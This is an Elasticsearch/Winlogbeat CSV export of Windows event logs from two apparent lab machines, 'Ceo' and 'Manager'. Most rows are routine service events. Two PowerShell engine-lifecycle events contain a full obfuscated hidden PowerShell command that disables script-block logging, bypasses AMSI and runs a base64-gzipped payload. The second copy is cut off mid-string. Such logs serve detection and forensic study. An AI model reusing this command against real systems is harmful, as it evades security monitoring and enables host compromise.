"@timestamp","_id","_index","_score","agent.ephemeral_id","agent.hostname","agent.id","agent.name","agent.type","agent.version","ecs.version","event.action","event.category","event.code","event.created","event.ingested","event.kind","event.outcome","event.provider","event.type","file.directory","file.extension","file.name","file.path","file.path.text","group.domain","group.id","group.name","host.architecture","host.hostname","host.id","host.ip","host.mac","host.name","host.os.build","host.os.family","host.os.kernel","host.os.name","host.os.name.text","host.os.platform","host.os.type","host.os.version","log.level",message,"powershell.file.script_block_id","powershell.file.script_block_text","powershell.sequence","powershell.total","process.executable","process.executable.text","process.name","process.name.text","process.pid","related.ip","related.user","source.domain","source.ip","source.port","user.domain","user.id","user.name","user.name.text","winlog.activity_id","winlog.api","winlog.channel","winlog.computer_name","winlog.event_data.AccountName","winlog.event_data.AuthenticationPackageName","winlog.event_data.Binary","winlog.event_data.CallerProcessId","winlog.event_data.CallerProcessName","winlog.event_data.ClientProcessId","winlog.event_data.CountOfCredentialsReturned","winlog.event_data.ElevatedToken","winlog.event_data.ErrorState","winlog.event_data.FailureReason","winlog.event_data.ImagePath","winlog.event_data.ImpersonationLevel","winlog.event_data.IpAddress","winlog.event_data.IpPort","winlog.event_data.KeyLength","winlog.event_data.LmPackageName","winlog.event_data.LogonGuid","winlog.event_data.LogonProcessName","winlog.event_data.LogonType","winlog.event_data.PrivilegeList","winlog.event_data.ProcessCreationTime","winlog.event_data.ReadOperation","winlog.event_data.RestrictedAdminMode","winlog.event_data.ReturnCode","winlog.event_data.ServiceName","winlog.event_data.ServiceType","winlog.event_data.StartType","winlog.event_data.Status","winlog.event_data.SubStatus","winlog.event_data.SubjectDomainName","winlog.event_data.SubjectLogonId","winlog.event_data.SubjectUserName","winlog.event_data.SubjectUserSid","winlog.event_data.TargetDomainName","winlog.event_data.TargetLinkedLogonId","winlog.event_data.TargetLogonId","winlog.event_data.TargetName","winlog.event_data.TargetOutboundDomainName","winlog.event_data.TargetOutboundUserName","winlog.event_data.TargetSid","winlog.event_data.TargetUserName","winlog.event_data.TargetUserSid","winlog.event_data.TransmittedServices","winlog.event_data.Type","winlog.event_data.VirtualAccount","winlog.event_data.param1","winlog.event_data.param10","winlog.event_data.param16","winlog.event_data.param17","winlog.event_data.param19","winlog.event_data.param2","winlog.event_data.param20","winlog.event_data.param21","winlog.event_data.param23","winlog.event_data.param3","winlog.event_data.param4","winlog.event_data.param5","winlog.event_data.param6","winlog.event_data.param7","winlog.event_data.param8","winlog.event_data.param9","winlog.event_id","winlog.keywords","winlog.logon.failure.reason","winlog.logon.failure.status","winlog.logon.failure.sub_status","winlog.logon.id","winlog.logon.type","winlog.opcode","winlog.process.pid","winlog.process.thread.id","winlog.provider_guid","winlog.provider_name","winlog.record_id","winlog.task","winlog.user.domain","winlog.user.identifier","winlog.user.name","winlog.user.type","winlog.version"
"Oct 23, 2022 @ 17:26:38.643",WXkqBIQByII7dpeEakxE,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16384,"Oct 23, 2022 @ 17:26:39.084","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Successfully scheduled Software Protection service for re-start at 2022-11-22T12:58:38Z. Reason: RulesEngine.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","2022-11-22T12:58:38Z","-","-","-","-",RulesEngine,"-","-","-","-","-","-","-","-","-","-",16384,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3920,"-","-","-","-","-","-"
"Oct 23, 2022 @ 17:26:20.362",wnkqBIQByII7dpeEIktv,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",16384,"Oct 23, 2022 @ 17:26:20.711","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Successfully scheduled Software Protection service for re-start at 2022-11-22T04:28:20Z. Reason: RulesEngine.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","2022-11-22T04:28:20Z","-","-","-","-",RulesEngine,"-","-","-","-","-","-","-","-","-","-",16384,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",4785,"-","-","-","-","-","-"
"Oct 23, 2022 @ 17:26:08.338",XnkpBIQByII7dpeE80uC,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16394,"Oct 23, 2022 @ 17:26:08.633","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Offline downlevel migration succeeded.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",16394,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3919,"-","-","-","-","-","-"
"Oct 23, 2022 @ 17:25:50.009",5nkpBIQByII7dpeEqkrr,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",16394,"Oct 23, 2022 @ 17:25:50.146","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Offline downlevel migration succeeded.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",16394,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",4784,"-","-","-","-","-","-"
"Oct 23, 2022 @ 17:13:54.537",PnkeBIQByII7dpeEwDmf,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",403,"Oct 23, 2022 @ 17:13:55.149","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b709d961-66c2-4b85-8bec-dbac427e0b44
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $h8=(('En{1}'+'ble'+'Sc{3}ipt{2'+'}lock{'+'0}o'+'gging')-f'L','a','B','r'); $gG=(('Script{2}loc{1'+'}'+'L'+'og'+'gi{0}g')-f'n','k','B'); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''+'Enabl'+'{5}Sc'+'{2}iptBlo'+'c{3}{1}n{4'+'}oca'+'tion{0}ogging'+'')-f'L','I','r','k','v','e');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType((('{'+'5}{'+'0}stem.{1}{'+'9'+'}n'+'{'+'9}'+'{2}'+'ement.{'+'7}{4}t'+'{8}m'+'{9'+'}'+'t'+'i{8}n.{7'+'}'+'ms'+'i{3}'+'ti{6'+'}s'+'')-f'y','M','g','U','u','S','l','A','o','a')); if ($xY) { $xY.GetField(((''+'am'+'{4}'+'i'+'{'+'3}'+'{1}'+'i{2}Fai{0}ed'+'')-f'l','n','t','I','s'),'NonPublic,Static').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType((('S{2}stem.{4}an'+'a{'+'1}'+'e'+'ment.A{'+'5}tomati'+'on.{0'+'}ti{3}s')-f'U','g','y','l','M','u')); $hbx=$zz4.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType((('Sy{3'+'}t'+'e'+'m.Mana{'+'2}em'+'ent.{1}{5}to'+'mation.Sc'+'ri{'+'0}tB{4}ock')-f'p','A','g','s','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb'+'46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E'+'43K'+'WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz'+'QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk'+'uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y'+'ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B'+'hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA'+'W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm'+'/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly'+'N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy'+'XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg'+'M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0'+'xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD'+'X0YT72p7Tu+yPUGQYu0+12R3'+'OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+'+'YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F'+'R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+'+'1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq'+'h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8'+'iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}')-f'=','o')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=5.1.19041.1682
	RunspaceId=9cdddfe0-f36f-4c51-a5f4-64d60c2aef27
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Stopped,"-","-","-","-",Available,"-","-","-","	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b709d961-66c2-4b85-8bec-dbac427e0b44
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $h8=(('En{1}'+'ble'+'Sc{3}ipt{2'+'}lock{'+'0}o'+'gging')-f'L','a','B','r'); $gG=(('Script{2}loc{1'+'}'+'L'+'og'+'gi{0}g')-f'n','k','B'); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''+'Enabl'+'{5}Sc'+'{2}iptBlo'+'c{3}{1}n{4'+'}oca'+'tion{0}ogging'+'')-f'L','I','r','k','v','e');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType((('{'+'5}{'+'0}stem.{1}{'+'9'+'}n'+'{'+'9}'+'{2}'+'ement.{'+'7}{4}t'+'{8}m'+'{9'+'}'+'t'+'i{8}n.{7'+'}'+'ms'+'i{3}'+'ti{6'+'}s'+'')-f'y','M','g','U','u','S','l','A','o','a')); if ($xY) { $xY.GetField(((''+'am'+'{4}'+'i'+'{'+'3}'+'{1}'+'i{2}Fai{0}ed'+'')-f'l','n','t','I','s'),'NonPublic,Static').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType((('S{2}stem.{4}an'+'a{'+'1}'+'e'+'ment.A{'+'5}tomati'+'on.{0'+'}ti{3}s')-f'U','g','y','l','M','u')); $hbx=$zz4.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType((('Sy{3'+'}t'+'e'+'m.Mana{'+'2}em'+'ent.{1}{5}to'+'mation.Sc'+'ri{'+'0}tB{4}ock')-f'p','A','g','s','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb'+'46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E'+'43K'+'WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz'+'QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk'+'uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y'+'ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B'+'hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA'+'W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm'+'/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly'+'N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy'+'XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg'+'M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0'+'xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD'+'X0YT72p7Tu+yPUGQYu0+12R3'+'OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+'+'YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F'+'R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+'+'1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq'+'h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8'+'iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}')-f'=','o')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=5.1.19041.1682
	RunspaceId=9cdddfe0-f36f-4c51-a5f4-64d60c2aef27
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",403,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4636,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:13:47.682",A3keBIQByII7dpeEpDmq,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",8224,"Oct 23, 2022 @ 17:13:47.983","-",event,"-",VSS,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"The VSS service is shutting down due to idle timeout. ","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-",2D20436F64653A2020434F525356434330303030303737342D2043616C6C3A2020434F525356434330303030303735362D205049443A202030303030363238342D205449443A202030303030313732342D20434D443A2020433A5C57696E646F77735C73797374656D33325C76737376632E6578652020202D20557365723A204E616D653A204E5420415554484F524954595C53595354454D2C205349443A532D312D352D313820,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",8224,Classic,"-","-","-","-","-",Info,"-","-","-",VSS,3918,"-","-","-","-","-","-"
"Oct 23, 2022 @ 17:13:43.148",AXkeBIQByII7dpeElTlg,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",403,"Oct 23, 2022 @ 17:13:44.071","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=216eacfd-66c9-4b27-88d7-9c271df3172c
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c If($PSVersionTable.PSVersion.Major -ge 3){ $yGgS=[Collections.Generic.Dictionary[string,System.Object]]::new(); $lMW9_=[Ref].Assembly.GetType((('S{1}s'+'tem.{2}ana{3'+'}ement.'+'{0}utomati'+'on.{4}t'+'i'+'{5'+'}s')-f'A','y','M','g','U','l')); $cP=$lMW9_.GetField('cachedGroupPolicySettings','NonPublic,Static'); $wO=(('Ena{2'+'}l{'+'3}Scrip{1}{0}lockL'+'o'+'ggi'+'ng')-f'B','t','b','e'); $ov7er=(('{'+'1'+'}nabl{5}{4}c{3'+'}i'+'pt{2}lockIn{0}ocat'+'ion'+'Log'+'ging')-f'v','E','B','r','S','e'); $h8Kp=[Ref].Assembly.GetType(((''+'{2}{6'+'}'+'s'+'t{9}m.{4}'+'ana{'+'5}{'+'9'+'}m{9'+'}n'+'t.'+'{7}{1}'+'t{'+'8'+'}ma'+'ti{'+'8}'+'n.{7}'+'msi{0}t'+'i{3}s'+'')-f'U','u','S','l','M','g','y','A','o','e')); if ($h8Kp) { $h8Kp.GetField(((''+'a{0'+'}'+'s'+'i'+'{'+'1}ni{3}Fail{2}{'+'4'+'}')-f'm','I','e','t','d'),'NonPublic,Static').SetValue($null,$true); }; $pIb5E=(('{1'+'}cr'+'ip{0}B'+'l'+'ock{2}ogging')-f't','S','L'); If ($cP) { $o9m3=$cP.GetValue($null); $yGgS.Add($wO,0); $yGgS.Add($ov7er,0); $o9m3['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$pIb5E]=$yGgS; If($o9m3[$pIb5E]){ $o9m3[$pIb5E][$wO]=0; $o9m3[$pIb5E][$ov7er]=0; } } Else { [Ref].Assembly.GetType((('S{5}{2}t'+'em'+'.{1}anage'+'ment.{0}{3}to'+'mation.Sc'+'r'+'ip'+'t{'+'4}lock')-f'A','M','s','u','B','y')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIAEvJ'+'VGMCA7VWbW/aSBD+Xqn/waqQMCrB5qVNE6nSre04'+'0ARi4gABik4be21vWXuJvQ6hvf73mzU4L5eklzuplhL2ZWZ29plnZjbIE09Qnig8V'+'368faPsPgenOFbUypJby7pSCY1Z7X6zcmsqn{1}V1jlYri8eYJ{2}vDQzNPU5KI7b'+'{1}{1}TATKMhJfMU{2}ytab8pUwikpK9s6tv{1}BPKD6XyZ+OY8SvMdmIbE3sRUfZQ4su9U+5h6VXDXTEq1OrXr9XafK+5aB{1}d55hlatXdZILEDZ+{1}ak35WZMHXm{1}WRK32qZfyjAeiMaFJu9UYJRkOyACs3ZA+ERH3sypc5f4yKRF5msg7SSNbEbUKQyfl'+'HvL9lGRZta7Mpfn5YvGHOt+dfZ4ngsak0UsESfnKJekN9UjW6OLEZ+ScBAvQc'+'kVKk3BRq4HYDV8StZLkjN'+'WV/2JGHZB1id{1}rldSHSiDliLRWh3g+uWWf+'+'zkjW73qM24WDKjBt2MBYPdTwheUvFlR{2}71+hjr3C+U3L3YIeKw6PKOF9mdFryt9OB0Lnm5gWrlIc'+'1Jb3OGtVPj{2}Q6/+WmvNUh'+'UU8wAW5mNO/cW9+qPYV0jkzaTQy0y2SEATYm0SHFOvJKv6XEhIwEgBSaMUG4B/anW3QXyLMB'+'JiIWGWzHiidhRTcad'+'r5JT5JEUehDUDryDitcfObCOnVntJn8QA3nYOVK0EkCKklN6l{1}aY8Xc5BqG{2}ynGV1{1}ckhR7264hLMiF9XUJLR3RbKBS+G'+'1Xt3+zkT1MOZKM0tav+Ac3esyZNMpLkHYQUILtwV8ShmEpG60qU+MTYuDcvjq8/iYWLGIHnA0g3EA1YkDq6QZEnB04IYtYZLRC9eMRKDTFEzbIZDqBC7FCnYhUPiV19wtMyFLfElMiUkD9yEcLuMi7{2}y'+'pqmACiRRz{2}P/5cPTylM4Y6ZkF{1}y1TLG5sREyBS{2}BJRhJmu4wKhBJBaBhpzw2cEY+draFRn2nnVEHwTe1uu6sJ9{1}+L2G02evD38ja90++fOtqtN3jfc/MnGP7E6LrcO19GiDP/+KTA3fcEe5RT5gO6g6pbnQiz9AvinE4pc0wHKHuReQ{1}3bG6mjvNdLruTqStrQ2v0+le6qjd7py19SXAJ3WWyB/EdH17CmO{2}qGenRi8z9B47+mKeX01a9mzCul'+'rHj{2}IJz9yPU0vTtAMfW/0NQgb32/3NZfOcX3S92OgkXDswO0t0hJCZHI1tg59Mj'+'RQ52hiHK74+iZZmHJ